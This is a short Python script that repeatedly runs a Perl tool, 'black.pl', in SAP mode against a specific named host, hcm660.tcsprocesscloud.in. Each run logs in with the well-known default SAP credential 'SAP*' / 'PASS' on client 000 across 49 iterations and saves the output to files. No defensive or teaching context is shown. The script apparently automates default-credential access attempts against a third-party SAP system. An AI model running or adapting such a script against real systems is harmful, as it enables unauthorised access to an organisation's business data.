from subprocess import *
import shlex
for i in range(1,50):
	filename = 'hcm660tcs'+str(i)+'.txt'
	with open(filename,'w') as fd:
		command_line = 'perl black.pl -sap -H hcm660.tcsprocesscloud.in -P 443 -ssl 1 -u SAP* -p PASS -c 000 -d -m '+str(i)
		args = shlex.split(command_line)
		if(Popen(args,stdout=fd,stderr=fd).poll()):
			continue
	
